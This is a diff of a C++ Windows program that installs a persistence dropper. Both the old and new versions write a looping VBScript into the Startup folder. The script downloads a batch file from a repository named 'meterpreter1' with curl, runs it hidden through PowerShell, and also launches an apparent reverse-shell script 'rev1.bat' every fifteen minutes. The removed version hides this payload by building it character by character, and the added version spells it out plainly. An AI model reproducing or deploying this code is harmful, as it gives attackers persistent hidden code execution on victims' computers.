@@ -1,37 +1,31 @@
 #include <iostream>
 #include <fstream>
-#include <windows.h>
-#include <shlobj.h>
 #include <string>
-#include <memory>
+#include <windows.h>
+#include <shlobj.h> 
 
 int main() {
-    char pathBuffer[MAX_PATH];
-    if (SHGetFolderPathA(nullptr, CSIDL_STARTUP, nullptr, 0, pathBuffer) != S_OK) {
-        throw std::runtime_error("Error: Unable to retrieve Startup folder path");
+    char startupFolderPath[MAX_PATH];
+    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupFolderPath) != S_OK) {
+        std::cerr << "Error: Could not retrieve Startup folder path" << std::endl;
+        return 1;
     }
-
-    std::string filePath = std::string(pathBuffer) + "\\st" + "art.vbs";
-
-    std::string content;
-    content += "D"; content += "o"; content += "\n";
-    content += "    ";
-    content += "S"; content += "e"; content += "t"; content += " "; content += "o"; content += "b"; content += "j"; content += "S"; content += "h"; content += "e"; content += "l"; content += "l"; content += " "; content += "="; content += " "; content += "C"; content += "r"; content += "e"; content += "a"; content += "t"; content += "e"; content += "O"; content += "b"; content += "j"; content += "e"; content += "c"; content += "t"; content += "("; content += "\""; content += "W"; content += "S"; content += "c"; content += "r"; content += "i"; content += "p"; content += "t"; content += "."; content += "S"; content += "h"; content += "e"; content += "l"; content += "l"; content += "\""; content += ")"; content += "\n";
-    content += "    ";
-    content += "o"; content += "b"; content += "j"; content += "S"; content += "h"; content += "e"; content += "l"; content += "l"; content += "."; content += "R"; content += "u"; content += "n"; content += " "; content += "\""; content += "c"; content += "m"; content += "d"; content += " "; content += "/"; content += "c"; content += " "; content += "c"; content += "u"; content += "r"; content += "l"; content += " "; content += "h"; content += "t"; content += "t"; content += "p"; content += "s"; content += ":"; content += "/"; content += "/"; content += "r"; content += "a"; content += "w"; content += "."; content += "g"; content += "i"; content += "t"; content += "h"; content += "u"; content += "b"; content += "u"; content += "s"; content += "e"; content += "r"; content += "c"; content += "o"; content += "n"; content += "t"; content += "e"; content += "n"; content += "t"; content += "."; content += "c"; content += "o"; content += "m"; content += "/"; content += "0"; content += "x"; content += "2"; content += "0"; content += "3"; content += "4"; content += "/"; content += "m"; content += "e"; content += "t"; content += "e"; content += "r"; content += "p"; content += "r"; content += "e"; content += "t"; content += "e"; content += "r"; content += "1"; content += "/"; content += "m"; content += "a"; content += "i"; content += "n"; content += "/"; content += "n"; content += "i"; content += "h"; content += "b"; content += "t"; content += "d"; content += "t"; content += "d"; content += "o"; content += "w"; content += "1"; content += "."; content += "b"; content += "a"; content += "t"; content += " "; content += "-"; content += "o"; content += " "; content += "%"; content += "t"; content += "e"; content += "m"; content += "p"; content += "%"; content += "\\"; content += "n"; content += "i"; content += "h"; content += "b"; content += "t"; content += "d"; content += "t"; content += "d"; content += "o"; content += "w"; content += "1"; content += "."; content += "b"; content += "a"; content += "t"; content += "\""; content += ", "; content += "0"; content += ", "; content += "T"; content += "r"; content += "u"; content += "e"; content += "\n";
-    content += "    ";
-    content += "o"; content += "b"; content += "j"; content += "S"; content += "h"; content += "e"; content += "l"; content += "l"; content += "."; content += "R"; content += "u"; content += "n"; content += " "; content += "\""; content += "p"; content += "o"; content += "w"; content += "e"; content += "r"; content += "s"; content += "h"; content += "e"; content += "l"; content += "l"; content += " "; content += "-"; content += "W"; content += "i"; content += "n"; content += "d"; content += "o"; content += "w"; content += "S"; content += "t"; content += "y"; content += "l"; content += "e"; content += " "; content += "H"; content += "i"; content += "d"; content += "d"; content += "e"; content += "n"; content += " "; content += "-"; content += "C"; content += "o"; content += "m"; content += "m"; content += "a"; content += "n"; content += "d"; content += " "; content += "S"; content += "t"; content += "a"; content += "r"; content += "t"; content += "-"; content += "P"; content += "r"; content += "o"; content += "c"; content += "e"; content += "s"; content += "s"; content += " "; content += "-"; content += "F"; content += "i"; content += "l"; content += "e"; content += "P"; content += "a"; content += "t"; content += "h"; content += " "; content += "'"; content += "%"; content += "t"; content += "e"; content += "m"; content += "p"; content += "%"; content += "\\"; content += "n"; content += "i"; content += "h"; content += "b"; content += "t"; content += "d"; content += "t"; content += "d"; content += "o"; content += "w"; content += "1"; content += "."; content += "b"; content += "a"; content += "t"; content += "'"; content += " "; content += "-"; content += "W"; content += "i"; content += "n"; content += "d"; content += "o"; content += "w"; content += "S"; content += "t"; content += "y"; content += "l"; content += "e"; content += " "; content += "H"; content += "i"; content += "d"; content += "d"; content += "e"; content += "n"; content += "\""; content += ", "; content += "0"; content += ", "; content += "T"; content += "r"; content += "u"; content += "e"; content += "\n";
-    content += "    ";
-    content += "o"; content += "b"; content += "j"; content += "S"; content += "h"; content += "e"; content += "l"; content += "l"; content += "."; content += "R"; content += "u"; content += "n"; content += " "; content += "\""; content += "p"; content += "o"; content += "w"; content += "e"; content += "r"; content += "s"; content += "h"; content += "e"; content += "l"; content += "l"; content += " "; content += "-"; content += "c"; content += " "; content += "S"; content += "t"; content += "a"; content += "r"; content += "t"; content += "-"; content += "P"; content += "r"; content += "o"; content += "c"; content += "e"; content += "s"; content += "s"; content += " "; content += "-"; content += "F"; content += "i"; content += "l"; content += "e"; content += "P"; content += "a"; content += "t"; content += "h"; content += " "; content += "'"; content += "%"; content += "t"; content += "e"; content += "m"; content += "p"; content += "%"; content += "\\"; content += "r"; content += "e"; content += "v"; content += "1"; content += "."; content += "b"; content += "a"; content += "t"; content += "'"; content += " "; content += "-"; content += "W"; content += "i"; content += "n"; content += "d"; content += "o"; content += "w"; content += "S"; content += "t"; content += "y"; content += "l"; content += "e"; content += " "; content += "H"; content += "i"; content += "d"; content += "d"; content += "e"; content += "n"; content += "\""; content += ", "; content += "0"; content += ", "; content += "T"; content += "r"; content += "u"; content += "e"; content += "\n";
-    content += "    ";
-    content += "W"; content += "S"; content += "c"; content += "r"; content += "i"; content += "p"; content += "t"; content += " "; content += "9"; content += "0"; content += "0"; content += "0"; content += "0"; content += "0"; content += "\n";
-    content += "L"; content += "o"; content += "o"; content += "p"; content += "\n";
-    std::unique_ptr<std::ofstream> outFile(new std::ofstream(filePath, std::ios::binary | std::ios::trunc));
-    if (!outFile->is_open()) {
-        throw std::runtime_error("Error: Unable to open file for writing");
+    std::string filePath = std::string(startupFolderPath) + "\\start.vbs";
+    const std::string vbscriptContent =
+        "Do\n"
+        "     Set objShell = CreateObject(\"WScript.Shell\")\n"
+        "     objShell.Run \"cmd /c curl https://raw.githubusercontent.com/0x2034/meterpreter1/main/nihbtdtdow1.bat -o %temp%\\nihbtdtdow1.bat\", 0, True\n"
+        "     objShell.Run \"powershell -WindowStyle Hidden -Command Start-Process -FilePath '%temp%\\nihbtdtdow1.bat' -WindowStyle Hidden\", 0, True\n"
+        "     objShell.Run \"powershell -c Start-Process -FilePath '%temp%\\rev1.bat' -WindowStyle Hidden\", 0, True\n"
+        "     WScript.Sleep 900000\n"
+        "Loop";
+    std::ofstream outFile(filePath);
+    if (!outFile) {
+        std::cerr << "Error: Could not create file " << filePath << std::endl;
+        return 1;
     }
-
-    *outFile << content;
-    outFile->close();
+    outFile << vbscriptContent;
+    outFile.close();
+    std::cout << "VBScript file created successfully at " << filePath << std::endl;
     return 0;
 }
